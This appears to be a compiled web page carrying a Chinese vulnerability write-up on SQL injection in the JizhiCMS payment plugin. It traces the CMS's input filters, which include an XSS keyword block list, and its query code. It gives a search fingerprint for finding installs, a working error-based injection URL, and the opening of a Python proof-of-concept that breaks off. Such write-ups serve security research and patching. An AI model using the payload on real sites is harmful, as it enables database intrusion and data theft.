import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e as t}from"./app-58e4a7d6.js";const p={},e=t(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>极致CMS支付插件中存在SQL注入漏洞，通过漏洞可以获取数据库信息</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>极致CMS
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>icon_hash=&quot;1657387632&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>查看一下进行过滤的函数</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token doc-comment comment">/**
	参数过滤，格式化
**/</span>
<span class="token keyword">function</span> <span class="token function-definition function">format_param</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token variable">$int</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">==</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
	<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$int</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token comment">//整数</span>
			<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$value</span><span class="token punctuation">;</span>
		<span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment">//字符串</span>
			<span class="token variable">$value</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">ENT_QUOTES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">version_compare</span><span class="token punctuation">(</span><span class="token constant">PHP_VERSION</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;7.4&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;&gt;=&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
				<span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
				<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			
			<span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
		<span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span><span class="token comment">//数组</span>
			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">==</span><span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">;</span>
			<span class="token function">array_walk_recursive</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;array_format&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
		<span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span><span class="token comment">//浮点</span>
			<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword type-casting">float</span><span class="token punctuation">)</span><span class="token variable">$value</span><span class="token punctuation">;</span>
		<span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>
			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">version_compare</span><span class="token punctuation">(</span><span class="token constant">PHP_VERSION</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;7.4&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;&gt;=&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
				<span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
				<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token keyword">return</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">//过滤XSS攻击</span>
<span class="token keyword">function</span> <span class="token function-definition function">SafeFilter</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$arr</span><span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
   <span class="token variable">$ra</span><span class="token operator">=</span><span class="token keyword">Array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/script/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/javascript/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/vbscript/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/expression/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/applet/&#39;</span>
   <span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/meta/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/xml/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/blink/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/link/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/style/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/embed/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/object/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/frame/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/layer/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/title/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/bgsound/&#39;</span>
   <span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/base/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onload/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onunload/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onchange/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onsubmit/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onreset/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onselect/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onblur/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onfocus/&#39;</span><span class="token punctuation">,</span>
   <span class="token string single-quoted-string">&#39;/onabort/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onkeydown/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onkeypress/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onkeyup/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onclick/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/ondblclick/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onmousedown/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onmousemove/&#39;</span>
   <span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onmouseout/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onmouseover/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onmouseup/&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;/onunload/&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     
   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
   <span class="token punctuation">{</span>
     <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=&gt;</span> <span class="token variable">$value</span><span class="token punctuation">)</span> 
     <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">version_compare</span><span class="token punctuation">(</span><span class="token constant">PHP_VERSION</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;7.4&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;&gt;=&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
				<span class="token variable">$value</span>  <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
			<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
				<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">get_magic_quotes_gpc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
					<span class="token variable">$value</span>  <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
				<span class="token punctuation">}</span>
			<span class="token punctuation">}</span>
          <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$ra</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//删除非打印字符，粗暴式过滤xss可疑字符串</span>
          <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span>     <span class="token operator">=</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token function">strip_tags</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//去除 HTML 和 PHP 标记并转换为 HTML 实体</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
          <span class="token function">SafeFilter</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
   <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>看一下执行的SQL语句的函数</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code> <span class="token comment">// 查询一条</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">find</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token variable">$order</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token variable">$fields</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token variable">$limit</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
	   <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$record</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">findAll</span><span class="token punctuation">(</span><span class="token variable">$where</span><span class="token punctuation">,</span> <span class="token variable">$order</span><span class="token punctuation">,</span> <span class="token variable">$fields</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token keyword">return</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$record</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
			<span class="token keyword">return</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>跟进 findAll 函数</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token comment">// 查询所有</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">findAll</span><span class="token punctuation">(</span><span class="token variable">$conditions</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token variable">$order</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token variable">$fields</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token variable">$limit</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
		<span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$conditions</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$join</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">foreach</span><span class="token punctuation">(</span> <span class="token variable">$conditions</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=&gt;</span> <span class="token variable">$value</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>
				<span class="token variable">$value</span> <span class="token operator">=</span>  <span class="token string single-quoted-string">&#39;\\&#39;&#39;</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token operator">.</span><span class="token string single-quoted-string">&#39;\\&#39;&#39;</span><span class="token punctuation">;</span>
				<span class="token variable">$join</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$key</span><span class="token punctuation">}</span></span> = <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$value</span><span class="token punctuation">}</span></span>&quot;</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;WHERE &quot;</span><span class="token operator">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot; AND &quot;</span><span class="token punctuation">,</span><span class="token variable">$join</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token constant">null</span> <span class="token operator">!=</span> <span class="token variable">$conditions</span><span class="token punctuation">)</span><span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;WHERE &quot;</span><span class="token operator">.</span><span class="token variable">$conditions</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$order</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
       		<span class="token variable">$where</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">&#39; ORDER BY &#39;</span><span class="token punctuation">;</span>
            <span class="token variable">$where</span> <span class="token operator">.=</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;,&#39;</span><span class="token punctuation">,</span> <span class="token variable">$order</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$order</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token variable">$where</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">&quot; ORDER BY  &quot;</span><span class="token operator">.</span><span class="token variable">$order</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
		
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$limit</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token variable">$where</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">&quot; LIMIT <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$limit</span><span class="token punctuation">}</span></span>&quot;</span><span class="token punctuation">;</span>
		<span class="token variable">$fields</span> <span class="token operator">=</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$fields</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">&quot;*&quot;</span> <span class="token punctuation">:</span> <span class="token variable">$fields</span><span class="token punctuation">;</span>
 
		<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$fields</span><span class="token punctuation">}</span></span> FROM <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">table</span><span class="token punctuation">}</span></span> <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$where</span><span class="token punctuation">}</span></span>&quot;</span><span class="token punctuation">;</span>
		
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>再跟进一下getData函数</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token comment">//获取数据</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getData</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span>
	<span class="token punctuation">{</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Statement</span><span class="token operator">-&gt;</span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$rows</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$rows</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Statement</span><span class="token operator">-&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">FETCH_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
		<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Statement</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>
		<span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$rows</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token variable">$rows</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>跟进query执行函数</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token comment">//执行SQL语句并检查是否错误</span>
	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filter</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Statement</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pdo</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">Statement</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token keyword">return</span> <span class="token variable">$this</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
			<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pdo</span><span class="token operator">-&gt;</span><span class="token function">errorInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;数据库错误：&#39;</span> <span class="token operator">.</span> <span class="token variable">$msg</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">filter</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>看到<code>$msg = $this-&gt;pdo-&gt;errorInfo();</code>语句，也就是说会把数据库报错信息打印在页面上并显示出来并退出</p><p>一套分析下来没有发现对sql语句的过滤，如果得到的数据没有经过<code>format_param</code>过滤，会产生注入</p><p>例如:</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword">function</span> <span class="token function-definition function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">M</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;member&#39;</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;username&#39;</span><span class="token operator">=&gt;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;name&#39;</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如果直接这样GET POST REQUEST 带入数据库 会产生报错注入</p><p>例如 ./exploit/name=123&#39; (加一个引号会报错，如果引号没过滤)</p><p>现在只需要寻找类型是这样没过滤直接带入数据库的语句就行了</p><p>简单寻找下其实这样的地方挺多的，拿一个位置举例子</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202170918836.jpg" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这里是一个支付插件的位置，蓝色方块1增加代码模拟开通支付宝功能通过验证</p><p>可以看到这个函数只使用[htmlspecialchars]来过滤了xss，sql语句没有过滤，用刚刚的方法来注入</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202170919997.jpg" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>可以看到的确出现了sql语句和数据库错误</p><p>直接报错注入获取敏感信息</p><ul><li><code>mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+&quot;</code></li></ul><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202170919441.jpg" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re

<span class="token triple-quoted-string string">&quot;&quot;&quot;
官网url : https://www.jizhicms.cn/
&quot;&quot;&quot;</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>
